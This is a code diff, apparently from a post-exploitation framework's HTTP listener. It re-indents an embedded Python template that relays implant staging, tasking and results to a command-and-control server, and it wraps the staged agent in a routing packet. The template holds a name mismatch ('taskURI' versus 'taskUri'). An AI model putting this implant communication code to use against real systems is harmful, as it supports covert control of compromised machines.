@@ -1049,36 +1049,36 @@ import sys
 
 
 class ExtendedPacketHandler(PacketHandler):
-def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
-    super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
-    self.headers = headers
-    self.taskURIs = taskURIs
-    self.server = server
-
-def post_message(self, uri, data):
-    return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
-
-def send_results_for_child(self, received_data):
-    self.headers['Cookie'] = "session=%s" % (received_data[1:])
-    taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-    requestUri = self.server + taskURI
-    response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
-    return response
-
-def send_get_tasking_for_child(self, received_data):
-    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-    taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-    requestUri = self.server + taskURI
-    response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
-    return response
-
-def send_staging_for_child(self, received_data, hop_name):
-    postURI = self.server + "/login/process.php"
-    self.headers['Hop-Name'] = hop_name
-    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-    response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
-    return response
-"""
+    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
+        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
+        self.headers = headers
+        self.taskURIs = taskURIs
+        self.server = server
+    
+    def post_message(self, uri, data):
+        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
+    
+    def send_results_for_child(self, received_data):
+        self.headers['Cookie'] = "session=%s" % (received_data[1:])
+        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
+        return response
+    
+    def send_get_tasking_for_child(self, received_data):
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
+        return response
+    
+    def send_staging_for_child(self, received_data, hop_name):
+        postURI = self.server + "/login/process.php"
+        self.headers['Hop-Name'] = hop_name
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
+        return response
+"""  # noqa: W293
             sendMessage += "    def send_message(self, packets=None):\n"
             sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
 
@@ -1535,7 +1535,12 @@ def send_staging_for_child(self, received_data, hop_name):
                                 # build malleable response with agent
                                 # note: stage1 comms are hard coded, can't use malleable here.
                                 return Response(
-                                    encryptedAgent,
+                                    packets.build_routing_packet(
+                                        stagingKey,
+                                        sessionID,
+                                        language,
+                                        encData=encryptedAgent,
+                                    ),
                                     200,
                                     implementation.server.headers,
                                 )
